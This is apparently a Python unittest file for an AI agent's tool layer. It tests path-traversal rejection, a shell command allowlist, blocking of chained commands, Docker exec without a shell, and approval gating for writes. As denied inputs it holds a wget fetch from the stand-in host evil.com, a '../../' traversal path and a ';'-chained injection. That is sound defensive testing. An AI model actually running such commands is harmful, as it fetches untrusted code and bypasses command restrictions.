import tempfile
import unittest
from unittest.mock import AsyncMock, patch
from pathlib import Path

from app.config import Settings
from app.tools.filesystem import edit_file, list_directory, read_file, search_repo
from app.tools.registry import get_registry
from app.tools.shell import run_command
from app.tools.safety import validate_workspace


class TestTools(unittest.IsolatedAsyncioTestCase):
    async def test_filesystem_path_traversal_rejected(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            workspace = tmp_dir
            res = await read_file({"path": "../../sensitive.txt"}, workspace)
            self.assertFalse(res.success)
            self.assertIn("Path traversal rejected", res.output)

    async def test_filesystem_write_and_read(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            workspace = tmp_dir
            write_res = await edit_file({"path": "hello.py", "mode": "write", "content": "print('hello world')"}, workspace)
            self.assertTrue(write_res.success)

            read_res = await read_file({"path": "hello.py"}, workspace)
            self.assertTrue(read_res.success)
            self.assertIn("print('hello world')", read_res.output)

    async def test_search_repo(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            workspace = tmp_dir
            await edit_file({"path": "app.py", "mode": "write", "content": "def test_func():\n    return 42\n"}, workspace)

            search_res = await search_repo({"pattern": "def test_func"}, workspace)
            self.assertTrue(search_res.success)
            self.assertIn("app.py:1: def test_func():", search_res.output)

    async def test_shell_command_allowlist_and_denial(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            workspace = tmp_dir
            # Disallowed command
            res = await run_command({"command": "wget http://evil.com/script.sh"}, workspace)
            self.assertFalse(res.success)
            self.assertIn("is not in the allowlist", res.output)

            # Allowed command execution
            res2 = await run_command({"command": "python --version"}, workspace)
            self.assertTrue(res2.success or res2.exit_code == 0)

            chained = await run_command({"command": "python --version; echo injected"}, workspace)
            self.assertNotIn("injected", chained.output)
            self.assertIn("Shell control operators are not allowed", chained.output)

    async def test_docker_command_uses_direct_exec_without_shell(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            process = AsyncMock()
            process.communicate.return_value = (b"Python test\n", None)
            process.returncode = 0
            with patch("app.tools.shell.get_settings", return_value=Settings(use_docker_sandbox=True)):
                with patch("app.tools.shell.asyncio.create_subprocess_exec", new=AsyncMock(return_value=process)) as spawn:
                    result = await run_command({"command": "python --version"}, tmp_dir)

            self.assertTrue(result.success)
            command_args = spawn.await_args.args
            self.assertNotIn("sh", command_args)
            self.assertNotIn("-lc", command_args)
            self.assertEqual(command_args[-2:], ("python", "--version"))

    async def test_write_tools_require_explicit_approval(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            result = await get_registry().dispatch(
                name="edit_file",
                tool_input={"path": "change.txt", "mode": "write", "content": "change"},
                workspace=tmp_dir,
                authorized_actions=["edit_files"],
            )
            self.assertFalse(result.success)
            self.assertIn("requires explicit approval", result.output)
            self.assertFalse((Path(tmp_dir) / "change.txt").exists())

    def test_workspace_must_be_inside_an_allowed_root(self):
        with tempfile.TemporaryDirectory() as root_dir, tempfile.TemporaryDirectory() as outside_dir:
            self.assertEqual(validate_workspace(root_dir, [Path(root_dir)]), Path(root_dir).resolve())
            with self.assertRaisesRegex(PermissionError, "outside allowed roots"):
                validate_workspace(outside_dir, [Path(root_dir)])


if __name__ == "__main__":
    unittest.main()
